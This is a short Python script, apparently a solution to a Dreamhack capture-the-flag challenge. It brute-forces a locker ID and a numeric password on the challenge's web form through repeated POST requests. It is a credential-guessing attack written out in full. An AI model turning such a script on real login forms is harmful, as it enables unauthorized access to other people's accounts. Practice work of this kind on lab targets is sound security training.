import requests
import time
from itertools import product


number = "0123456789"
lowercase = "abcdefghijklmnopqrstuvwxyz"
uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
symbol = "!@#$%^&*()_+-=`~"
possibility = lowercase + number
attempt = product(possibility, repeat=1)
start = time.time()

url="http://host3.dreamhack.games:10332/"
data={}
def run(locker_num):
    for pw in range(100,201):
        param={"locker_num":locker_num, "password":pw}
        res = requests.post(url,data=param)
        if res.text.find("Good") == -1:
            print(param)
            data=param
            break
        print(param)

def run_ln():
    for i in attempt:
        param={"locker_num":"v2de"+"".join(i), "password":0}
        res=requests.post(url,data=param)
        print(param)
        if res.text.find("Good") > 0 :
            print("find! ; ",param)
            break

#run_ln()
run("v2de")

print(data)
